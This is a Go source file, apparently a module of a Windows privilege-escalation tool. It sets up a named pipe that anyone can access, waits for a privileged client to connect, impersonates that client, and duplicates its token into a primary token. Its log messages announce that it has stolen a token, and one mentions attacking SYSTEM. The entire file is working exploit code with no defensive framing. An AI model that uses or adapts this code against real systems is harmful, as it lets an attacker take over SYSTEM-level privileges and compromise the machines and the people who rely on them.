package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type NamedPipeNegotiator struct{}

func (negotiator NamedPipeNegotiator) Serve() NegotiatorResult {
	var sd windows.SECURITY_DESCRIPTOR
	pipeName := "\\\\.\\pipe\\test"

	_, _, err := initializeSecurityDescriptor.Call(uintptr(unsafe.Pointer(&sd)), 1)
	if err == syscall.Errno(0) {
		_, _, err = setSecurityDescriptorDacl.Call(uintptr(unsafe.Pointer(&sd)), 1, 0, 0)
		if err != syscall.Errno(0) {
			fmt.Println("[!] Couldn't allow everyone to read pipe - if you are attacking SYSTEM this is fine")
		} else {
			fmt.Println("[+] Set DACL to allow anyone to access")
		}
	}

	sa := windows.SecurityAttributes{
		Length:             40,
		SecurityDescriptor: &sd,
		InheritHandle:      0,
	}
	pipeHandle, err := windows.CreateNamedPipe(windows.StringToUTF16Ptr(pipeName), windows.PIPE_ACCESS_DUPLEX, windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT|windows.PIPE_REJECT_REMOTE_CLIENTS, 10, 2048, 2048, 0, &sa)

	if err != nil {
		fmt.Println("[!] Failed to create pipe "+pipeName+": ", windows.GetLastError())
		return NegotiatorResult{nil, err}
	}

	fmt.Println("[+] Created pipe, listening for connections")
	err = windows.ConnectNamedPipe(pipeHandle, nil)

	if err != nil {
		fmt.Println("[!] Failed to connect to pipe "+pipeName+": ", windows.GetLastError())
		windows.CloseHandle(pipeHandle)
		return NegotiatorResult{nil, err}
	}

	fmt.Println("[+] Connection established, duplicating client token")

	buf := []byte{0}
	_, err = windows.Read(pipeHandle, buf)

	if err != nil {
		fmt.Println("[!] Failed to read from pipe")
		return NegotiatorResult{nil, err}
	}

	_, _, err = impersonateNamedPipeClient.Call(uintptr(pipeHandle))

	if err != syscall.Errno(0) {
		fmt.Println("[!] Call to ImpersonateNamedPipeClient failed")
		return NegotiatorResult{nil, err}
	}

	threadHandle, err := windows.GetCurrentThread()

	if err != nil {
		fmt.Println("[!] Failed to get current thread")
		return NegotiatorResult{nil, err}
	}

	var threadToken windows.Token
	err = windows.OpenThreadToken(threadHandle, windows.TOKEN_ALL_ACCESS, false, &threadToken)

	if err != nil {
		fmt.Println("[!] Failed to open thread token")
		return NegotiatorResult{nil, err}
	}

	var systemToken windows.Token
	err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil, SecurityImpersonation, windows.TokenPrimary, &systemToken)

	if err != nil {
		fmt.Println("[!] Failed to duplicate client token")
		return NegotiatorResult{nil, err}
	}

	hostName, _ := os.Hostname()
	principal, _ := systemToken.GetTokenUser()
	sid := principal.User.Sid
	account, domain, _, _ := sid.LookupAccount(hostName)
	fmt.Println("[+] Stole token from " + domain + "\\" + account + " (" + sid.String() + ")")

	windows.RevertToSelf()
	windows.CloseHandle(pipeHandle)

	return NegotiatorResult{&systemToken, nil}
}

func (negotiator NamedPipeNegotiator) Trigger() bool {
	return true
}
